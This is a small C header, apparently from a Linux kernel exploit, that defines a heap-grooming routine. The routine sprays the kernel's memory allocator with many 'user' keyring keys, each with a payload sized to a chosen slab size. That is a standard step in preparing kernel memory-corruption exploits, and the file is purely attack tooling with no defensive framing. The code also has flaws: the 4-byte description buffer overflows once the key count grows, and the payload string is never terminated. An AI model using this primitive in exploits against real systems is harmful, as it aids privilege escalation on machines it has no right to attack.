#ifndef _USER_KEY_PAYLOAD_TMPL_H_
#define _USER_KEY_PAYLOAD_TMPL_H_

#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <keyutils.h>

void do_defragment(unsigned kmalloc_size, unsigned num) {
    int i = 0;
    char type[5] = "user";
    char* description = (char*)malloc(sizeof(char)*4);
    char* payload = (char*)malloc(sizeof(char)*kmalloc_size-0x18);
    memset(payload, 'A', kmalloc_size-0x18-0x1);
    for (i = 0; i < num ; i++) {
        key_serial_t key;
        sprintf(description, "%d", i);
        key = add_key(type, description, payload, strlen(payload), KEY_SPEC_USER_KEYRING);
        if (key == -1) {
            perror("add_key");
            exit(0);
        }
    }
}

#endif
